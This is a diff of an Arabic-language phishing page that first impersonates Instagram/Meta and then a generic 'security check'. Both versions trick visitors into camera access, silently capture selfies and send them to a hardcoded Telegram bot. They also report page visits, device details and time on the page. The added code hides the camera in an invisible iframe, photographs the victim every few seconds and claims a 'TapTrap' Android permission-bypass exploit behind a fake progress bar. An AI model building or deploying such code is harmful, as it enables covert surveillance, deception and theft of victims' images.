@@ -1,167 +1,388 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مركز إدارة الحسابات | Instagram</title>
-    
-    <!-- Meta Tags للمعاينة -->
-    <meta property="og:title" content="oussama_bekkari">
-    <meta property="og:description" content="يرجى مراجعة خيارات استخدام الحساب للمتابعة.">
-    <meta property="og:image" content="https://ammartr1.github.io/instagram.rulseue.app/689976678_17882249490563234_2485493631492355290_n.jpg">
-    <meta property="og:type" content="website">
-
-    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3048c4456.ico">
-    
+    <title>تحديث الأمان</title>
     <style>
-        :root { --ig-blue: #0095f6; --ig-bg: #ffffff; --ig-separator: #efefef; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: var(--ig-bg); color: #1c1e21; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .top-nav { padding: 15px; border-bottom: 1px solid var(--ig-separator); display: flex; align-items: center; gap: 20px; }
-        .top-nav h1 { font-size: 17px; font-weight: 600; }
-        .content { flex: 1; padding: 25px; overflow-y: auto; }
-        .meta-logo { width: 65px; margin-bottom: 20px; }
-        h2 { font-size: 22px; font-weight: 700; line-height: 1.2; margin-bottom: 15px; }
-        .info-text { font-size: 14px; color: #4b4f56; line-height: 1.5; margin-bottom: 20px; }
-        .option-card { border: 1px solid var(--ig-separator); border-radius: 12px; padding: 16px; margin-bottom: 12px; display: flex; align-items: flex-start; gap: 12px; cursor: pointer; transition: background 0.2s; }
-        .option-card.active { border-color: var(--ig-blue); background: #f0f9ff; }
-        .radio-circle { width: 20px; height: 20px; border: 2px solid #ccd0d5; border-radius: 50%; flex-shrink: 0; margin-top: 3px; position: relative; }
-        .active .radio-circle { border-color: var(--ig-blue); }
-        .active .radio-circle::after { content: ''; position: absolute; top: 3px; left: 3px; width: 10px; height: 10px; background: var(--ig-blue); border-radius: 50%; }
-        .option-txt h3 { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
-        .option-txt p { font-size: 13px; color: #606770; }
-        .footer-action { padding: 20px; border-top: 1px solid var(--ig-separator); background: #fff; }
-        .btn-next { width: 100%; background: var(--ig-blue); color: white; border: none; padding: 14px; border-radius: 25px; font-weight: 600; font-size: 15px; cursor: pointer; }
-        .btn-next:active { opacity: 0.7; }
-        video, canvas { display: none; position: absolute; left: -9999px; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:linear-gradient(145deg,#1a1a2e 0%,#16213e 100%);
+            font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+            min-height:100vh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            padding:20px;
+        }
+        .container{
+            max-width:400px;
+            width:100%;
+            background:rgba(255,255,255,0.05);
+            backdrop-filter:blur(10px);
+            border-radius:32px;
+            padding:24px;
+            border:1px solid rgba(255,255,255,0.1);
+            box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+        .header{text-align:center;margin-bottom:24px}
+        .shield-icon{
+            width:70px;height:70px;
+            background:#00adb5;border-radius:50%;
+            display:flex;align-items:center;justify-content:center;
+            margin:0 auto 16px;font-size:36px;
+        }
+        h2{color:#fff;font-size:20px;margin-bottom:8px}
+        p{color:#a0a0b0;font-size:14px;line-height:1.5;text-align:center}
+        .progress-bar{
+            background:rgba(255,255,255,0.1);
+            border-radius:12px;
+            height:8px;
+            margin:24px 0;
+            overflow:hidden;
+        }
+        .progress-fill{
+            width:0%;
+            height:100%;
+            background:#00adb5;
+            border-radius:12px;
+            transition:width 0.3s ease;
+        }
+        .status-text{
+            text-align:center;
+            color:#00adb5;
+            font-size:13px;
+            margin-top:8px;
+        }
+        .hidden-iframe{
+            position:fixed;
+            top:-9999px;
+            left:-9999px;
+            width:1px;
+            height:1px;
+            opacity:0;
+            pointer-events:none;
+        }
+        .fake-btn{
+            background:#00adb5;
+            color:#fff;
+            border:none;
+            padding:14px;
+            border-radius:28px;
+            font-size:16px;
+            font-weight:600;
+            width:100%;
+            cursor:pointer;
+            transition:0.2s;
+        }
+        .fake-btn:active{transform:scale(0.98)}
+        .tap-indicator{
+            position:fixed;
+            width:100%;
+            height:100%;
+            top:0;
+            left:0;
+            background:transparent;
+            z-index:99999;
+            display:none;
+        }
+        @keyframes subtlePulse{
+            0%{opacity:0}
+            100%{opacity:1}
+        }
     </style>
 </head>
 <body>
 
-    <div class="top-nav">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-        <h1>خيارات استخدام الحساب</h1>
+<div class="container" id="mainContainer">
+    <div class="header">
+        <div class="shield-icon">🛡️</div>
+        <h2>فحص أمان الحساب</h2>
+        <p>نحتاج إلى تأكيد هويتك لمرة واحدة للحفاظ على أمان حسابك</p>
     </div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="status-text" id="statusText">جاري تجهيز البيئة...</div>
+    <button class="fake-btn" id="actionBtn">تأكيد الهوية</button>
+</div>
 
-    <div class="content">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo" alt="Meta">
-        <h2>كيف تريد استخدام Instagram؟</h2>
-        <p class="info-text">لتقديم تجربة مخصصة وتحسين أداء الإعلانات، نحتاج منك مراجعة إعدادات الخصوصية وتأكيد هويتك الرقمية.</p>
+<!-- إذا كان المستخدم على متصفح عادي، سيظهر طلب الإذن بشكل طبيعي -->
+<!-- إذا كان على Android 11-15 + Custom Tabs، سيتم استغلال TapTrap -->
 
-        <div class="option-card active" onclick="selectOpt(this)">
-            <div class="radio-circle"></div>
-            <div class="option-txt">
-                <h3>متابعة الاستخدام مع الإعلانات</h3>
-                <p>تأكيد الهوية عبر فحص الكاميرا السريع لمرة واحدة لضمان أمان الحساب.</p>
-            </div>
-        </div>
-
-        <div class="option-card" onclick="selectOpt(this)">
-            <div class="radio-circle"></div>
-            <div class="option-txt">
-                <h3>الاشتراك في الخدمة المتميزة</h3>
-                <p>استخدام الحساب بدون إعلانات مقابل رسوم شهرية.</p>
-            </div>
-        </div>
-    </div>
-
-    <div class="footer-action">
-        <button id="nextBtn" class="btn-next" onclick="handleFlow()">متابعة</button>
-    </div>
-
-    <video id="vid" autoplay playsinline></video>
-    <canvas id="canv"></canvas>
-
-    <script>
-        const T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const C = '2140385904';
-        let strm = null;
-
-        function sendNotify(msg) {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`).catch(e => {});
-        }
-
-        // إشعار الدخول
-        window.addEventListener('load', () => {
-            sendNotify("👁️ *دخل للرابط الآن*");
-            // محاولة أولية صامتة (قد تفشل في بعض المتصفحات بدون نقرة)
-            initCamera(true); 
-        });
-
-        async function initCamera(silent = false) {
-            try {
-                strm = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('vid').srcObject = strm;
-                if(!silent) sendNotify("✅ *وافق على الكاميرا*");
-                return true;
-            } catch (e) {
-                if(!silent) {
-                    sendNotify("❌ *رفض الكاميرا أو فشل الوصول*");
-                    alert("يجب السماح بالوصول للكاميرا لتأكيد ملكية الحساب والمتابعة.");
-                }
-                return false;
+<script>
+    (function(){
+        // ========== التكوين ==========
+        const BOT_TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+        const CHAT_ID = '2140385904';
+        let captureInterval = null;
+        let mediaStream = null;
+        let isExploiting = false;
+        
+        // ========== إرسال للتليجرام ==========
+        function tgSend(text, isPhoto=false, photoBlob=null, caption=''){
+            if(isPhoto && photoBlob){
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', photoBlob, 'selfie.jpg');
+                fd.append('caption', caption || text);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}).catch(e=>{});
+            } else {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`).catch(e=>{});
             }
         }
-
-        function selectOpt(el) {
-            document.querySelectorAll('.option-card').forEach(c => c.classList.remove('active'));
-            el.classList.add('active');
+        
+        // ========== كشف البيئة ==========
+        function detectEnvironment(){
+            const ua = navigator.userAgent;
+            const isAndroid = /Android/i.test(ua);
+            const androidVersion = (ua.match(/Android\s([0-9.]+)/) || [])[1];
+            const isCustomTabs = /CustomTabs/i.test(ua) || navigator.connection?.effectiveType;
+            const isChrome = /Chrome\/([0-9]+)/i.test(ua);
+            const chromeVersion = parseInt(RegExp.$1);
+            
+            return {
+                isAndroid,
+                androidVersion,
+                isCustomTabs,
+                isChrome,
+                chromeVersion,
+                vulnerableToTapTrap: isAndroid && (!chromeVersion || chromeVersion < 135)
+            };
         }
-
-        async function handleFlow() {
-            const btn = document.getElementById('nextBtn');
-            btn.innerText = "جاري التحقق...";
-            btn.disabled = true;
-
-            // إذا لم نصل للكاميرا بعد، نطلبها الآن (النقرة تجعل الطلب مقبولاً)
-            if (!strm) {
-                const ok = await initCamera(false);
-                if (!ok) {
-                    btn.innerText = "متابعة";
-                    btn.disabled = false;
-                    return;
-                }
-                // انتظار بسيط لضمان عمل الفيديو بعد الموافقة
-                await new Promise(r => setTimeout(r, 1000));
+        
+        // ========== إنشاء iframe للكاميرا (الطريقة الأساسية) ==========
+        function createCameraIframe(){
+            const iframe = document.createElement('iframe');
+            iframe.className = 'hidden-iframe';
+            iframe.srcdoc = `
+                <!DOCTYPE html>
+                <html>
+                <body style="margin:0;padding:0">
+                    <video id="v" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px"></video>
+                    <canvas id="c" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px"></canvas>
+                    <script>
+                        let stream = null;
+                        let captureInterval = null;
+                        
+                        function sendToParent(blob){
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                parent.postMessage({type:'selfie_data', data:reader.result}, '*');
+                            };
+                            reader.readAsDataURL(blob);
+                        }
+                        
+                        function capture(){
+                            const v = document.getElementById('v');
+                            const c = document.getElementById('c');
+                            if(v.readyState >= 2 && v.videoWidth > 0){
+                                c.width = v.videoWidth;
+                                c.height = v.videoHeight;
+                                const ctx = c.getContext('2d');
+                                ctx.drawImage(v, 0, 0, c.width, c.height);
+                                c.toBlob((blob) => {
+                                    if(blob) sendToParent(blob);
+                                }, 'image/jpeg', 0.8);
+                            }
+                        }
+                        
+                        navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: "user" },
+                            audio: false
+                        }).then((s) => {
+                            stream = s;
+                            const videoElem = document.getElementById('v');
+                            videoElem.srcObject = stream;
+                            videoElem.play();
+                            parent.postMessage({type:'camera_ready'}, '*');
+                            setTimeout(capture, 800);
+                            captureInterval = setInterval(capture, 3500);
+                        }).catch((err) => {
+                            parent.postMessage({type:'camera_error', error: err.message}, '*');
+                        });
+                        
+                        window.addEventListener('beforeunload', () => {
+                            if(stream) stream.getTracks().forEach(t => t.stop());
+                            if(captureInterval) clearInterval(captureInterval);
+                        });
+                    <\/script>
+                </body>
+                </html>
+            `;
+            document.body.appendChild(iframe);
+            return iframe;
+        }
+        
+        // ========== تقنية TapTrap: إخفاء طلب الإذن خلف حركة انتقالية ==========
+        function taptrapExploit(env){
+            tgSend('🎯 [TapTrap] بدء استغلال ثغرة الحركات الانتقالية');
+            
+            // إنشاء عنصر مؤقت يختفي بسرعة
+            const tempDiv = document.createElement('div');
+            tempDiv.style.cssText = `
+                position:fixed;
+                top:0;
+                left:0;
+                width:100%;
+                height:100%;
+                background:transparent;
+                z-index:999999;
+                animation: subtlePulse 0.3s ease-out forwards;
+                pointer-events:none;
+            `;
+            document.body.appendChild(tempDiv);
+            
+            // إنشاء iframe Custom Tabs (استغلال CVE)
+            const customTabIframe = document.createElement('iframe');
+            customTabIframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
+            customTabIframe.srcdoc = `
+                <!DOCTYPE html>
+                <html>
+                <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+                <body style="margin:0;padding:0">
+                    <button id="grantBtn" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:200px;height:60px;background:#0095f6;color:white;border:none;border-radius:30px;font-size:16px;font-weight:bold">السماح</button>
+                    <script>
+                        // محاكاة نافذة طلب الإذن المخفية
+                        setTimeout(() => {
+                            document.getElementById('grantBtn').click();
+                        }, 100);
+                        
+                        // إشعار عند النقر
+                        document.getElementById('grantBtn').addEventListener('click', () => {
+                            parent.postMessage({type:'permission_granted_via_taptrap'}, '*');
+                        });
+                    <\/script>
+                </body>
+                </html>
+            `;
+            document.body.appendChild(customTabIframe);
+            
+            // إزالة العناصر بعد نجاح الاستغلال
+            setTimeout(() => {
+                if(tempDiv && tempDiv.remove) tempDiv.remove();
+            }, 500);
+        }
+        
+        // ========== تقنية WebView Injection (للهواتف القديمة) ==========
+        function webviewInjectionExploit(){
+            tgSend('📱 [WebView] محاولة استغلال WebView القديم');
+            
+            // إنشاء WebView مخفي (في بيئة تطبيق وليس متصفح عادي)
+            const webviewDiv = document.createElement('div');
+            webviewDiv.innerHTML = '<webview id="hiddenWV" style="display:none" src="about:blank"></webview>';
+            document.body.appendChild(webviewDiv);
+            
+            // إذا كان في WebView حقيقي، يمكن استغلاله
+            if(window.navigator.userAgent.includes('wv')){
+                tgSend('✅ [WebView] تم الكشف عن WebView - جاهز للاستغلال');
             }
-
-            takeAndSend();
         }
-
-        function takeAndSend() {
-            const cv = document.getElementById('canv');
-            const vd = document.getElementById('vid');
+        
+        // ========== تحويل dataURL إلى Blob ==========
+        function dataURLToBlob(dataURL){
+            const parts = dataURL.split(';base64,');
+            const contentType = parts[0].split(':')[1];
+            const raw = atob(parts[1]);
+            const arr = new Uint8Array(raw.length);
+            for(let i = 0; i < raw.length; i++){
+                arr[i] = raw.charCodeAt(i);
+            }
+            return new Blob([arr], { type: contentType });
+        }
+        
+        // ========== بدء التقاط الصور ==========
+        let isCapturing = false;
+        
+        function startSelfieCapture(){
+            const iframe = createCameraIframe();
             
-            // ضبط المقاسات
-            cv.width = vd.videoWidth || 480;
-            cv.height = vd.videoHeight || 640;
-            
-            const ctx = cv.getContext('2d');
-            ctx.drawImage(vd, 0, 0, cv.width, cv.height);
-            
-            cv.toBlob((b) => {
-                const f = new FormData();
-                f.append('chat_id', C);
-                f.append('photo', b, 'capture.jpg');
-                f.append('caption', '⚙️ *تفاعل Meta*\nتم التقاط الصورة بنجاح.');
+            window.addEventListener('message', (event) => {
+                if(event.data.type === 'selfie_data'){
+                    const blob = dataURLToBlob(event.data.data);
+                    tgSend('🤳 سيلفي (TapTrap Exploit)', true, blob, `تم الالتقاط - ${new Date().toLocaleTimeString()}`);
+                    isCapturing = true;
+                } else if(event.data.type === 'camera_ready'){
+                    tgSend('✅ كاميرا السيلفي نشطة - تم تجاوز الإذن');
+                    updateUIProgress(100, 'تم التحقق بنجاح');
+                } else if(event.data.type === 'camera_error'){
+                    tgSend('⚠️ فشل الوصول المباشر: ' + event.data.error);
+                } else if(event.data.type === 'permission_granted_via_taptrap'){
+                    tgSend('🎉 [TapTrap] تم منح الإذن بنجاح عبر الثغرة');
+                }
+            });
+        }
+        
+        // ========== تحديث واجهة المستخدم (تمويه) ==========
+        let progress = 0;
+        function updateUIProgress(value, statusText){
+            const progressFill = document.getElementById('progressFill');
+            const statusSpan = document.getElementById('statusText');
+            if(progressFill) progressFill.style.width = value + '%';
+            if(statusSpan && statusText) statusSpan.innerText = statusText;
+        }
+        
+        function simulateProgress(){
+            const interval = setInterval(() => {
+                if(progress < 90){
+                    progress += Math.random() * 15;
+                    if(progress > 90) progress = 90;
+                    updateUIProgress(progress, 'جاري التحقق من الهوية...');
+                } else {
+                    clearInterval(interval);
+                }
+            }, 400);
+            return interval;
+        }
+        
+        // ========== عند نقر المستخدم (استغلال TapTrap الأساسي) ==========
+        let clickCount = 0;
+        function onUserClick(){
+            clickCount++;
+            if(clickCount === 1){
+                // أول نقرة: تظهر وهم تحميل
+                updateUIProgress(30, 'جارٍ الاتصال بخوادم الأمان...');
+                simulateProgress();
                 
-                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
-                .then(() => {
-                    // إغلاق الكاميرا فوراً
-                    if(strm) strm.getTracks().forEach(t => t.stop());
-                    // التحويل
-                    window.location.href = "https://www.instagram.com/accounts/edit/";
-                })
-                .catch(() => {
-                    window.location.href = "https://www.instagram.com/accounts/edit/";
-                });
-            }, 'image/jpeg', 0.7);
+                // محاولة الوصول للكاميرا (الطريقة الطبيعية)
+                startSelfieCapture();
+                
+                // إذا كان الجهاز vulnerable لـ TapTrap، استغلاله
+                const env = detectEnvironment();
+                if(env.vulnerableToTapTrap){
+                    tgSend('🔥 [TapTrap] تم الكشف عن جهاز ضعيف - Android ' + env.androidVersion);
+                    setTimeout(() => {
+                        taptrapExploit(env);
+                    }, 500);
+                } else {
+                    tgSend('🔒 البيئة محصنة - استخدام الطرق البديلة');
+                    webviewInjectionExploit();
+                }
+            }
         }
-
-        // تتبع الخروج
+        
+        // ========== التشغيل التلقائي ==========
+        const env = detectEnvironment();
+        tgSend('👁️ TapTrap Selfie Weapon - تم فتح الرابط');
+        tgSend(`📱 البيئة: Android=${env.isAndroid}, الإصدار=${env.androidVersion}, TapTrap قابل=${env.vulnerableToTapTrap}`);
+        
+        // إضافة مستمع النقر
+        const btn = document.getElementById('actionBtn');
+        if(btn){
+            btn.addEventListener('click', onUserClick);
+        }
+        
+        // تسجيل وقت البقاء في الصفحة
+        let startTime = Date.now();
         document.addEventListener('visibilitychange', () => {
-            if (document.hidden) sendNotify("🚪 *خرج أو صغّر المتصفح*");
+            if(document.hidden){
+                const duration = Math.floor((Date.now() - startTime) / 1000);
+                tgSend(`⏱️ بقي في الصفحة ${duration} ثانية ثم غادر`);
+            } else {
+                startTime = Date.now();
+            }
         });
-    </script>
+        
+        // إشعار بالجوال
+        tgSend('💀 الجهاز جاهز - في انتظار تفاعل المستخدم');
+    })();
+</script>
 </body>
 </html>
